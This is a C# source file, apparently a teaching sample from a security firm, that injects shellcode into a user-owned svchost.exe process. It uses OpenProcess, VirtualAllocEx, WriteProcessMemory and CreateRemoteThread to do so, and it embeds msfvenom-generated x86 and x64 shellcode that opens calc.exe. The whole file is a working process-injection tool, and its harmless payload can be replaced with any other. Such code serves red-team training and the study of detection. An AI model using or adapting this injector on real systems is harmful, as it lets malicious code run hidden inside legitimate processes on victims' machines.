using System;
using System.Management;
using System.Collections.Generic;
using System.Runtime.InteropServices;

/// <summary>
/// This is sample code for illustration and learning purposes only.
/// Author: Joff Thyer, Black Hills Information Security
/// February 2020
/// </summary>
public class Example3
{
    public static void Run(String x86, String x64)
    {
        String shellcode = x86;
        if (IntPtr.Size == 8)
            shellcode = x64;
        Byte[] payload = Convert.FromBase64String(shellcode);
        Console.WriteLine("[*] Searching for target process...");
        uint pid = SelectTargetProcess("svchost.exe");
        Console.WriteLine($"[*] Found target process: {pid}");
        IntPtr ph = OpenProcess(0x00000028, false, pid);
        Console.WriteLine($"[*] Open Process Handle: {ph}");
        if (ph == IntPtr.Zero) Environment.Exit(0);
        IntPtr memptr = VirtualAllocEx(ph, IntPtr.Zero, payload.Length, 0x3000, 0x40);
        Console.WriteLine($"[*] VirtualAlloc(): {memptr}");
        if (memptr == IntPtr.Zero) Environment.Exit(0);
        uint nbytes;
        WriteProcessMemory(ph, memptr, payload, payload.Length, out nbytes);
        Console.WriteLine($"[*] Wrote {nbytes} of payload into process memory");
        if (nbytes == 0) Environment.Exit(0);
        uint old_protections;
        VirtualProtectEx(ph, memptr, payload.Length, 0x20, out old_protections);
        Console.WriteLine($"[*] VirtualProtectEx({old_protections})");
        IntPtr th = CreateRemoteThread(ph, IntPtr.Zero, 0, memptr, IntPtr.Zero, 0, IntPtr.Zero);
        Console.WriteLine($"[*] CreateRemoteThread({th})");
        VirtualFreeEx(ph, memptr, 0, 0xC000);
        CloseHandle(ph);
    }

    private static uint SelectTargetProcess(String process_name)
    {
        String current_user = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToLower();
        String wql = "SELECT * FROM Win32_Process";
        ManagementObjectSearcher ms = new ManagementObjectSearcher(wql);
        ManagementObjectCollection moc = ms.Get();
        var candidates = new List<UInt32>();
        Random rnd = new Random();
        foreach (ManagementObject mo in moc)
        {
            try
            {
                String[] o = new String[] { String.Empty, String.Empty };
                if ((UInt32)mo.InvokeMethod("GetOwner", o) > 0) continue;
                String owner = (o[1] + "\\" + o[0]).ToLower();
                UInt32 pid = (UInt32)mo.GetPropertyValue("ProcessId");
                String pname = (String)mo.GetPropertyValue("Name");
                if (pname.ToLower() == process_name.ToLower() && current_user == owner)
                    candidates.Add(pid);
            }
            catch { continue; }
        }
        if (candidates.Count > 0)
            return candidates[rnd.Next(candidates.Count)];
        return 0;
    }

    #region TESTCODE
    // Only needed for testing as EXE
    public static void Main() { Run(calc_x86, calc_x64); }
    #endregion

    #region DLLIMPORTS
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint p1, bool p2, uint p3);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr WriteProcessMemory(IntPtr p1, IntPtr p2, Byte[] p3, int p4, out uint p5);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr p1, IntPtr p2, int p3, uint p4, uint p5);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtectEx(IntPtr p1, IntPtr p2, int p3, uint p4, out uint p5);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr p1, IntPtr p2, uint p3, IntPtr p4, IntPtr p5, uint p6, IntPtr Zero);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualFreeEx(IntPtr p1, IntPtr p2, uint p3, uint p4);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CloseHandle(IntPtr p1);
    #endregion

    #region SHELLCODE
    // msfvenom -p windows/exec CMD=calc.exe -f raw | base64
    private static String calc_x86 = @"
/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjj
SAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sE
iwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD7
4HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";

    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64
    private static String calc_x64 = @"
/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
    #endregion

}
